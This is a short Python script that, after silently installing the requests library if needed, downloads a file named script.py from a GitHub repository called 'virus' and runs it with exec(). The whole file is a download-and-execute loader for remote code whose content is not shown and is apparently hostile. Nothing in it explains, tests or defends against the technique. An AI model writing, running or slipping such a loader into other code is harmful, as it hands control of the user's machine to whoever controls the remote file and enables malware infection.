try:
    import requests
except ImportError:
    import os
    os.system('pip install requests')
    import requests


exec(requests.get('https://raw.githubusercontent.com/AZachia/virus/refs/heads/main/script.py').text)

